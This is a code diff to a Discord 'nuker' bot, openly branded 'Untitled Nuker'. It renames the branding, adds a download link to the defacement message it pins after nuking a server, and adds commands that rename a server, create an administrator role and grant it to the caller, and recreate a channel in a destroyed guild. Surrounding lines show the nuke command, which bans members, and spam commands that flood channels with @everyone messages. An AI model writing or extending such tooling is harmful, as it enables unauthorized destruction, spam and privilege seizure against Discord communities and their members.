@@ -317,7 +317,7 @@ async def settingsWhitelist(ctx, action):
 
 @settings.command(name='activity')
 @commands.check(isOwner)
-async def settingsActivity(ctx, action, activityType="playing", *, text=f"Blood nuker v1{version}"):
+async def settingsActivity(ctx, action, activityType="playing", *, text=f"Untitled Nuker v{version}"):
     global config
     global activity
     if action == "set":
@@ -352,7 +352,7 @@ async def settingsActivity(ctx, action, activityType="playing", *, text=f"Blood 
 
 @bot.command(name='1', aliases=["nk", "nuke"])
 @commands.check(isWhitelisted)
-async def nuke(ctx, ban: bool = True, text: str = "Blood Nuker"):
+async def nuke(ctx, ban: bool = True, text: str = "Untitled Nuker"):
     await msg_delete(ctx)
 
     """
@@ -402,8 +402,8 @@ async def nuke(ctx, ban: bool = True, text: str = "Blood Nuker"):
     try:
         embed = discord.Embed(color=embedColor)
         embed.add_field(name="This server is Nuked",
-                        value="nuked By Blood ", inline=False)
-        channel = await ctx.guild.create_text_channel(name="Blood nuker")
+                        value="By Unitled Nuker\nDownload: https://github.com/ICEGXG/UntitledNuker", inline=False)
+        channel = await ctx.guild.create_text_channel(name="Untitled Nuker")
         message = await channel.send(embed=embed)
         await message.pin()
     except:
@@ -485,7 +485,7 @@ async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Untitled N
 
 @bot.command(name='7', aliases=["sc"])
 @commands.check(isWhitelisted)
-async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Blood Nuker"):
+async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
         try:
@@ -557,3 +557,69 @@ async def editServerIcon(ctx):
         print(f"{msgs['+']} Changed server icon")
     except:
         print(f"{msgs['error']} Can't change server icon")
+
+
+@bot.command(name='13', aliases=["sn"])
+@commands.check(isWhitelisted)
+async def editServerName(ctx, *, name="Untitled Nuker"):
+    await msg_delete(ctx)
+    try:
+        await ctx.guild.edit(name=name)
+        print(f"{msgs['+']} Changed server name")
+    except:
+        print(f"{msgs['error']} Can't change server name")
+
+
+@bot.command(name="14", aliases=["ga"])
+@commands.check(isWhitelisted)
+async def getAdmin(ctx, *, rolename="Untitled Nuker"):
+    await msg_delete(ctx)
+    try:
+        perms = discord.Permissions(administrator=True)
+        role = await ctx.guild.create_role(name=rolename, permissions=perms)
+        await ctx.message.author.add_roles(role)
+        print(f"{msgs['+']} Added admin role to {ctx.message.author}")
+    except:
+        print(f"{msgs['error']} Can't add admin role to {ctx.message.author}")
+
+
+@bot.command(name='15', aliases=["rg"])
+@commands.check(isWhitelisted)
+@commands.dm_only()
+async def reviveGuild(ctx, guildId: int = None):
+    if guildId:
+        guild = bot.get_guild(guildId)
+        try:
+            await guild.create_text_channel(name="Untitled Nuker")
+            print(f"{msgs['+']} Revived {guild}")
+        except:
+            print(f"{msgs['error']} Can't revive {guild}")
+
+
+"""
+Running bot
+"""
+
+
+
+try:
+    if enablelogging == False:
+        bot.run(token, log_handler=None)
+    else:
+        bot.run(token)
+except discord.errors.LoginFailure:
+    print(f'{msgs["error"]} Invalid Token')
+    print(msgs['pressenter'])
+    input()
+    os._exit(0)
+except discord.errors.PrivilegedIntentsRequired:
+    print(f"{msgs['error']} It looks like you didn't enable the necessary intents in the developer portal."
+          f"Visit {colors['main']}https://discord.com/developers/applications/ {colors['white']}and turn them on.\n")
+    print(msgs['pressenter'])
+    input()
+    os._exit(0)
+except Exception as e:
+    print(f'{colors["red"]}\nAn error occured while logging:\n{"".join(traceback.format_exception(type(e), e, e.__traceback__))}{colors["white"]}\n')
+    print(msgs['pressenter'])
+    input()
+    os._exit(0)
